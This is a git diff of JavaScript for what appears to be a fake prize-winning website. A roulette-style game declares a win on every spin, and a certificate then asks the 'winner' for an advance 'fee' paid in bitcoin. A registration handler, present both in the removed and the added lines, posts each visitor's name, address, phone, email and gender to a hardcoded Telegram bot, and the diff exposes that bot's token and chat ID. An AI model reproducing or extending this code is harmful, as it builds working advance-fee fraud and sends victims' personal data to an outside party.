@@ -2,44 +2,8 @@ const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
 const TELEGRAM_CHAT_ID = "874563737";  // Replace this with your actual chat ID
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-document.getElementById('registrationForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-
-    const formData = new FormData(e.target);
-    const registrationData = {};
-    formData.forEach((value, key) => {
-        registrationData[key] = value;
-    });
-
-    // Save registration data to local storage
-    localStorage.setItem('registrationData', JSON.stringify(registrationData));
-
-    const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;
-
-    fetch(TELEGRAM_API_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message
-        })
-    }).then(response => response.json()).then(data => {
-        if (data.ok) {
-            document.getElementById('registration').style.display = 'none';
-            document.getElementById('gameSelection').style.display = 'block';
-        } else {
-            alert('Registration failed. Please try again.');
-        }
-    }).catch(error => {
-        console.error('Error:', error);
-        alert('Registration failed. Please try again.');
-    });
-});
-
 const prizes = [
-    { amount: '$50,000.00', fee: '$650' },
+    { amount: '$50,000.00', fee: '$500' },
     { amount: '$100,000.00', fee: '$1000' },
     { amount: '$125,000.00', fee: '$1250' },
     { amount: '$150,000.00', fee: '$1500' },
@@ -56,58 +20,44 @@ const prizes = [
     { amount: '$1,000,000.00', fee: '$10000' }
 ];
 
-let attempts = 0;
+let perfecthalf = ((1 / 37) * 360) / 2;
+let currentLength = perfecthalf;
+$(".wheel img").css("transform", "rotate(" + perfecthalf + "deg)");
 
-// Jackpot Game Logic
-if (document.getElementById('playJackpot')) {
-    document.getElementById('playJackpot').addEventListener('click', function() {
-        attempts++;
-        if (attempts <= 3) {
-            const prize = prizes[Math.floor(Math.random() * prizes.length)];
-            document.getElementById('jackpotResult').innerText = `You won ${prize.amount}!`;
-            showCertificate(prize);
-        } else {
-            attempts = 0;
-            document.getElementById('jackpotResult').innerText = 'Try again!';
-        }
-    });
+$(".spin").click(() => {
+    $(".wheel img").css("filter", "blur(8px)");
+    let spininterval = getRandomInt(0, 37) * (360 / 37) + getRandomInt(3, 4) * 360;
+    currentLength += spininterval;
+    let numofsecs = spininterval;
+
+    console.log(currentLength);
+    $(".wheel img").css("transform", "rotate(" + currentLength + "deg)");
+
+    setTimeout(function () {
+        $(".wheel img").css("filter", "blur(0px)");
+        displayResult(currentLength);
+    }, numofsecs);
+});
+
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-// Spinning Board Game Logic
-if (document.getElementById('spinButton')) {
-    document.getElementById('spinButton').addEventListener('click', function() {
-        const spinner = document.getElementById('spinner');
-        spinner.style.animation = "spin 2s linear infinite";
+function displayResult(angle) {
+    const segmentAngle = 360 / 37; // Assuming 37 segments for the roulette
+    const index = Math.floor(((360 - angle % 360) % 360) / segmentAngle);
+    const prize = prizes[index % prizes.length];
 
-        setTimeout(() => {
-            spinner.style.animation = "";
-            const prize = prizes[Math.floor(Math.random() * prizes.length)];
-            document.getElementById('spinningResult').innerText = `You won ${prize.amount}!`;
-            showCertificate(prize);
-        }, 2000);
-    });
-}
-
-// Ball Scratch Game Logic
-if (document.getElementById('ballContainer')) {
-    const ballContainer = document.getElementById('ballContainer');
-    prizes.forEach((prize, index) => {
-        const ball = document.createElement('div');
-        ball.className = 'ball';
-        ball.innerText = index + 1;
-        ball.addEventListener('click', function() {
-            document.getElementById('ballScratchResult').innerText = `You won ${prize.amount}!`;
-            showCertificate(prize);
-        });
-        ballContainer.appendChild(ball);
-    });
+    const resultElement = document.getElementById('result');
+    resultElement.innerText = `🎉 Congratulations! You have won ${prize.amount}!`;
+    showCertificate(prize);
 }
 
 function showCertificate(prize) {
     const registrationData = getRegistrationData();
     document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize.amount}.`;
     document.getElementById('paymentAmount').innerText = prize.fee;
-    document.getElementById('game').style.display = 'none';
+    document.getElementById('result').style.display = 'none';
     document.getElementById('certificate').style.display = 'block';
 }
 
@@ -153,3 +103,38 @@ if (document.getElementById('bitcoinPaymentForm')) {
         alert(`Payment of ${paymentInfo.amount} BTC sent to ${paymentInfo.wallet}. Thank you!`);
     });
 }
+
+document.getElementById('registrationForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(e.target);
+    const registrationData = {};
+    formData.forEach((value, key) => {
+        registrationData[key] = value;
+    });
+
+    localStorage.setItem('registrationData', JSON.stringify(registrationData));
+
+    const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;
+
+    fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+        })
+    }).then(response => response.json()).then(data => {
+        if (data.ok) {
+            document.getElementById('registration').style.display = 'none';
+            document.getElementById('gameSelection').style.display = 'block';
+        } else {
+            alert('Registration failed. Please try again.');
+        }
+    }).catch(error => {
+        console.error('Error:', error);
+        alert('Registration failed. Please try again.');
+    });
+});
